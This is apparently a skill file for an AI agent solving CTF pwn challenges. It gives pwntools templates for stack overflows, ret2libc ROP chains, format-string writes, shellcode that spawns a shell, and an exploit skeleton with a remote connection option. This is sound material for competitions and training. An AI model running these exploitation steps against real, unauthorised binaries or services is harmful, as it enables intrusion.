---
name: ctf-pwn
description: >-
  Activate this skill when a CTF challenge involves binary exploitation, memory
  corruption, or pwn categories. Covers buffer overflows, ROP chains, heap
  exploitation, format string attacks, ret2libc, shellcoding, and kernel pwn.
  Use after ctf-recon and when a compiled binary is provided.
---

# CTF Binary Exploitation (Pwn) Skill

## Step 1 — Binary Analysis
```bash
# Check protections
checksec --file=<BINARY>
# Look for: RELRO, Stack Canary, NX, PIE, ASLR

# Static analysis
file <BINARY>
strings <BINARY> | grep -i flag
objdump -d <BINARY> | head -100
readelf -a <BINARY>

# Dynamic analysis
ltrace ./<BINARY>
strace ./<BINARY>
```

## Step 2 — Identify Vulnerability Class

### Buffer Overflow (Stack)
```python
# Find offset with cyclic pattern
from pwn import *
cyclic(200)           # generate pattern
cyclic_find(0x61616175)  # find offset from crash EIP/RIP

# Basic ret2win
from pwn import *
elf = ELF('./binary')
p = process('./binary')
win_addr = elf.sym['win']
payload = b'A' * offset + p64(win_addr)
p.sendline(payload)
p.interactive()
```

### ROP Chain (NX enabled)
```python
from pwn import *
elf = ELF('./binary')
libc = ELF('./libc.so.6')
rop = ROP(elf)

# ret2libc
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.call(elf.sym['main'])
# leak libc base → calculate system/bin_sh → shell
```

### Format String
```python
# Leak stack/libc with %p, %s
# Arbitrary write with %n
# pwntools fmtstr_payload
from pwn import *
payload = fmtstr_payload(offset, {target_addr: value})
```

### Heap Exploitation
```bash
# Identify allocator: glibc ptmalloc2, tcmalloc, jemalloc
# Common techniques:
# - tcache poisoning (glibc >= 2.26)
# - fastbin dup
# - unsorted bin attack
# - house of force/spirit/lemon
```

## Step 3 — Exploit Development
```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'  # or 'i386'
context.log_level = 'debug'

# Local test
p = process('./binary')
# Remote
# p = remote('<IP>', <PORT>)

gdb.attach(p, '''
break *main+50
continue
''')

# Your exploit here
```

## Step 4 — Gadget Hunting
```bash
ROPgadget --binary <BINARY> --rop
one_gadget libc.so.6
ropper -f <BINARY>
```

## Step 5 — Shellcraft
```python
from pwn import *
shellcode = asm(shellcraft.amd64.linux.sh())
shellcode = asm(shellcraft.amd64.linux.cat('/flag'))
```

## Key Tools
- `pwntools` — exploit framework
- `GDB + pwndbg/peda/gef` — dynamic analysis
- `ROPgadget`, `ropper`, `one_gadget` — ROP
- `Ghidra`, `IDA Free`, `Binary Ninja` — static RE
- `angr` — symbolic execution for CTF
- `patchelf` — change binary's libc

## Structured Output
```json
{
  "agent": "ctf-pwn",
  "binary_info": {"arch":"", "protections":{}},
  "vuln_class": "",
  "exploit_script": "",
  "flag_candidates": [],
  "confidence": 0.0
}
```
